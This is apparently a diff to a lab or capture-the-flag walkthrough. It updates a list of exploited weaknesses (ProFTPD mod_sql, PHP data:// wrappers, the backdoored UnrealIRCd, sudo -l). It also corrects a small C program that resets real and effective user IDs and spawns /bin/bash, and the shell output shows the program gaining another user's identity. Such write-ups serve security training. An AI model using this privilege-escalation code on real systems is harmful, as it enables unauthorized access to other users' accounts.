@@ -7,7 +7,7 @@
 <https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html>
 
 
-ProFTPD 1.2.8 - 1.2.9 mod_sql, php wrappers data://text/plain;base64, UnrealIRCd
+Keys : ProFTPD 1.2.8 - 1.2.9 mod_sql, php wrappers data://text/plain;base64, UnrealIRCd, sudo -l
 
 # Scan
 
@@ -203,12 +203,13 @@ Get jetta's UID
 void main() {
     setreuid(geteuid(), getuid());
     setregid(getegid(), getgid());
-    system("/bin.bash");
+    system("/bin/bash");
 }
 
 ```
 
     sh-4.2$ gcc get.c -o get
+    sh-4.2$ ./get
     sh-4.2$ id
     uid=1001(mauk) gid=1001(mauk) euid=1002(jetta) groups=1002(jetta),1001(mauk)
     sh-4.2$ ./get 
